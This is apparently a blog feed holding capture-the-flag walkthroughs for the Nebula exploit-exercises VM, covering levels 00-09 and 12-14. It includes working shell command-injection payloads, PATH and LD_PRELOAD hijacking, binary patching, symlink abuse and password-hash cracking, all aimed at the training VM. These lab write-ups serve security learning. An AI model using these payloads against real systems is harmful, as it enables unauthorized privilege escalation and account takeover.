<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level12">(full)</a>: Access the flag account through a Lua script that seems to send the token with a certan SHA1 checksum.</p>

<div>
  <pre><code class='console'>$ nc 127.0.0.1 50001
Password: $(getflag), which is $(whoami) &gt; ~/getflag.log
Better luck next time
$ cat /home/flag12/getflag.log
You have successfully executed getflag on a target account, which is flag12</code></pre>
</div>


<p>According to the Internet, SHA1 checksums are, for all practical purposes, irreversible. This means that the solution path probably <em>doesn&rsquo;t</em> require us to find the unhashed input.</p>

<p>This turns out to be the case. We execute arbitrary code via this line, where our input is the variable <code>..password..</code>:</p>

<div>
  <pre><code class='console'>prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)</code></pre>
</div>


<h2>Level 13</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: A program returns the token if the real uid is equal to <code>FAKEUID</code>, defined by a preprocessor macro.</p>

<p>Given the source code, there seem to be two points of vulnerability for the program.
1. The call to <code>getuid()</code>: can we substitute our own version of the function?
2. The preprocessor macro for <code>FAKEUID</code>: can we redefine <code>FAKEUID</code>?</p>

<h3>Overriding <code>getuid()</code></h3>

<p>We link a shared library with our own function definition of <code>getuid()</code>, adding it through the <code>LD_PRELOAD</code> environmental variable. Because <code>suid</code> programs ignore <code>LD_PRELOAD</code>, we copy the binary to our own directory and modify the permissions.</p>

<div>
  <pre><code class='c'>// custom_uid.c
#include systypes.h

uid_t getuid()
{
    return 1000;
}</code></pre>
</div>




<div>
  <pre><code class='console'>$ # Create a shared library
$ cd ~
$ gcc -fPIC -g -c custom_uid.c
$ gcc -shared -W1,-soname,uid.so -o uid.so custom_uid.o -lc
$ ls *.so
uid.so</code></pre>
</div>




<div>
  <pre><code class='console'>$ # Preload the shared library
$ export LD_PRELOAD=./uid.so
$ cp /home/flag13/flag13 ~
$ ldd flag13 | grep uid.so
./uid.so (0x001c3000)
$ chmod a+x ~/flag13
$ ~/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
$ su flag13
sh-4.2$ getflag
You have successfully executed getflag on a target account</code></pre>
</div>


<p>I wasn&rsquo;t familiar with these shared library vulnerabilities before these levels. To cite my sources, here are posts that I found during my search for &ldquo;overriding functions&rdquo;:</p>

<ul>
<li><a href="http://stackoverflow.com/a/618059/892168">Overriding functions in C</a>, Stack Overflow.</li>
<li><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf">Course notes for suid exploits</a>, Syracuse University</li>
</ul>


<h3>Redefining <code>fakeuid</code></h3>

<p>Unfortunately, it turns out that we can&rsquo;t quite &ldquo;redefine&rdquo; the preprocessor macro, since the binary is compiled without any debug flags from <code>gcc</code>.</p>

<p><code>FAKEUID</code> is defined by 1000 (hex: <code>0x03e8</code>). We can take a look at the assembly using <code>objdump</code>.</p>

<div>
  <pre><code class='console'>$ echo $UID
1014
$ printf '%x\n' 1014 # Our uid in hex
3f6
$ printf '%x\n' 1000 # FAKEUID in hex
3e8
$ objdump -d flag13 | grep 3e8
80484f4:        3d e8 03 00 00      cmp     __$0x3e8__,%eax
…
$ cp /home/flag13/flag13 ~
$ vim ~/flag13
$ # … Make the substitution described below #</code></pre>
</div>


<p>Our magic number is represented by <code>3d e8</code> because of the <a href="http://en.wikipedia.org/wiki/Little_endian#Little-endian">little-endian architecture</a>. Our goal is to change <code>0x3e8</code> to <code>0x3f6</code>, which is 1014 in binary.</p>

<p>vim can be used to <a href="http://stackoverflow.com/a/839549/892168">edit binary files</a>. (I&rsquo;m an emacs user, but vim comes with the VM). We change <code>3de8</code> to <code>3df6</code> in the binary.</p>

<div>
  <pre><code class='console'>$ ~/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58</code></pre>
</div>


<h2>Level 14</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level13">(full)</a>: <code>flag14 -e</code> encrypts stdin. A token file needs to be decrypted.</p>

<div>
  <pre><code class='bash'>#!/bin/bash
# try.sh
# A helper function for pattern finding
try()
{
    echo &quot;$@&quot; | /home/flag14/flag14 -e; echo&quot;&quot;
}</code></pre>
</div>




<div>
  <pre><code class='console'>$ source ~/try.sh
$ try 1; try @; try a
1
@
a
$ try 0231 # 0 - 0 = 0 | 3 - 2 = 1 | 5 - 3 = 2 |  4 - 1 = 3
0354</code></pre>
</div>


<p>If we play around more, there seems to be a simple pattern: the encryption scheme increments each character by its index.</p>

<div>
  <pre><code class='c'>// decrypt.c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main (int argc, char*argv[])
{
    for (int i = 0; i &lt; strlen(argv[1]); i++)
        printf(&quot;%c&quot;, argv[1][i] - i);
    printf(&quot;\n&quot;);
}</code></pre>
</div>




<div>
  <pre><code class='console'>$ gcc -std=c99 -o decrypt decrypt.c
$ cat /home/flag14/token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
$ ./decrypt $(cat /home/flag14/token)
8457c118-887c-4e40-a5a6-33a25353165
$ su flag14
Password:
sh4.2$ getflag
You have successfully executed getflag on a target account</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 00-09)]]></title>
    <link href="http://louisrli.github.io/blog/2012/06/22/nebula0/"/>
    <updated>2012-06-22T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/06/22/nebula0</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p>Nebula is a series of &ldquo;capture the flag&rdquo; exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I&rsquo;ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> &mdash; this was a good supplement.</p>

<p>The provided Ubuntu VM has 20 levels (00 &ndash; 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>

<h1>Solutions</h1>

<p>To keep things shorter, a link to the full description is provided with each level. The full description contains relevant source code.</p>

<p>There&rsquo;s no copy paste for Ubuntu Server VMs, but I included the output when it supplemented the solution.</p>

<h2>Level 0</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>

<div>
  <pre><code class='bash'>$ find / -perm /u+s</code></pre>
</div>


<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>

<!-- more -->


<h2>Level 1</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code>/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>

<div>
  <pre><code class='console'>$ export PATH=~:$PATH
$ /bin/echo &quot;whoami; getflag&quot; &gt; ~/echo
$ chmod a+x ~/echo
$ /home/flag01/flag01</code></pre>
</div>


<p><code>env</code> looks in the <code>PATH</code> variable to find a program to run. Adding an executable named <code>echo</code> to an earlier directory in the path will execute the program.</p>

<h2>Level 2</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code>/bin/echo $USER</code>, execute an arbitrary program.</p>

<div>
  <pre><code class='console'>$ export USER=&quot;hi echoing; whoami; getflag&quot;
$ /home/flag02/flag02
about to call system(&quot;/bin/echo hi echoing; whoami; getflag is cool&quot;)
hi echoing
flag02
You have successfully executed getflag on target account</code></pre>
</div>


<h2>Level 3</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code>cron</code> job that runs occasionally. In the home directory, there is a <code>writable.sh</code> and a <code>writable.d/</code>.</p>

<div>
  <pre><code class='console'>$ cd /home/flag03
$ ls
writable.d   writable.sh

$ # ./writable.sh runs a for loop with &quot;bash -x $i&quot; for i in writable.d/*
$ echo &quot;whoami&quot; &gt; /tmp/log; getflag &gt;&gt; /tmp/log&quot; &gt; ./writable.d/foo
$ # Wait a few minutes for the cron job
$ cat /tmp/log
flag03
You have successfully executed getflag on target account</code></pre>
</div>


<p>Since cron jobs don&rsquo;t write output to <code>stdout</code>, the output should be logged in a file.</p>

<h2>Level 4</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code>flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code>"token"</code>. Examine the file <code>/home/flag04/token/</code>.</p>

<div>
  <pre><code class='console'>$ cd /tmp/
$ ln -s /home/flag04/ ./foo
$ cd /home/flag04/
$ ./flag04 /tmp/foo</code></pre>
</div>


<p><code>token</code> contains the password to the <code>flag04</code> account. <code>su flag04</code> and capture the flag.</p>

<h2>Level 5</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code>/home/flag05/</code>.</p>

<div>
  <pre><code class='console'>$ cd /home/flag05
$ ls -la
$ `/home/flag05` contains `.ssh` (unreadable) and `.backup` (execute access!) directories
$ ls .backup
backup-19072011.tgz
$ # tar tzf backup-19072011.tgz shows that it contains the .ssh directory
$ cd .backup
$ tar xzf backup-19072011.tgz -C ~
$ cd ~/.ssh
$ ssh -i id_rsa flag05@localhost
flag05@nebula:~$ getflag</code></pre>
</div>


<p>The <code>-C</code> flag for <code>tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code>flag05</code>.</p>

<h2>Level 6</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code>flag06</code> account credentials are from a legacy UNIX system.</p>

<p>Account credentials points toward <code>/etc/passwd</code>:</p>

<div>
  <pre><code class='console'>$ cat /etc/passwd/ |  grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</code></pre>
</div>


<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code>/etc/passwd</code>. Now, these are placed in the no-read <code>/etc/shadow/</code> (or a variant). The <code>flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>

<div>
  <pre><code class='console'>$ cd ~
$ wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
$ tar xzf john-1.7.9.tar.gz
$ cd john-1.7.9.tar.gz/src
$ make clean linux-x86-sse2
$ cd ../run
$ ./john /etc/passwd
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello             (flag06)
...
$ su flag06
Password:
sh-4.2$ getflag</code></pre>
</div>


<h2>Level 7</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level07">(full)</a>: A Perl CGI script attempts to ping a given host.</p>

<div>
  <pre><code class='console'>$ cd /home/flag07
$ perl index.cgi Host=&quot;google.com | getflag&quot;
$ # Yields a &quot;getflag is executing on a non-flag account, this doesn't count&quot;
$ cat thttpd.conf | grep flag07
dir=/home/flag07
user=flag07
$ ps aux | grep thttpd
$ # Interestingly, two thttpd web server instances are running on flag07 and flag16
$ cat thttpd.conf | grep port=
port=7007
$ cd ~ &amp;&amp; wget localhost:7007/index.cgi --post-data=&quot;Host=google.com | getflag&quot;
$ cat index.cgi
&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
</div>


<p>If we run the script with <code>perl</code>, <code>getflag</code> still runs as the <code>level07</code> user. The vulnerability exists in <code>thttpd.conf</code>, which runs commands as <code>flag07</code> (<code>user=flag07</code>). Capturing the flag requires using <code>thttpd.conf</code>.</p>

<p><code>ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code>wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code>flag07</code> user.</p>

<h2>Level 8</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code>capture.pcap</code> file to see what <code>flag08</code> was doing.</p>

<div>
  <pre><code class='console'>$ cd /home/flag08
$ # -X prints in ASCII; -q removes extraneous information, -r points to a file
$ tcpdump -X -q -r capture.pcap | less</code></pre>
</div>


<p>After mucking around with <code>tcpdump</code> in ASCII mode, however, it&rsquo;s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code>tshark</code>) to examine packets, but the virtual machine doesn&rsquo;t have these. However, a program named <code>tcpflow</code> is available.</p>

<div>
  <pre><code class='console'>$ # -c prints to stdout, -r points to a file
$ tcpflow -c -r capture.pcap | less</code></pre>
</div>


<p>After the <code>Password:</code> prompt, the <code>flag08</code> user typed &ldquo;backdoor&hellip;00Rm8.ate&rdquo;. A few tries for <code>su flag08</code> with <code>backdoor</code> and <code>backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:
1. the password is based on words
2. each packet represents a key press to the server
&ldquo;Backdoor mate&rdquo; could be <code>backdoorm8</code>, <code>backd00Rm8</code>, etc. If the period represents deletion, then the password is <code>backd00Rmate</code>.</p>

<div>
  <pre><code class='console'>$ su flag08
Password:
sh-4.2$ getflag</code></pre>
</div>


<h2>Level 9</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one &mdash; <code>$useme</code>.</p>

<div>
  <pre><code class='console'>$ cd ~
$ echo &quot;[email {\$use_me(getflag)}]&quot; &gt; foo
$ /home/flag09/flag09 ./foo exec
[error]
You have successfully executed getflag on target account</code></pre>
</div>


<p>This exploits PHP&rsquo;s &ldquo;variable of variables.&rdquo; Executing <code>flag09 ~/foo system</code> also works.</p>
]]></content>
  </entry>
  
</feed>
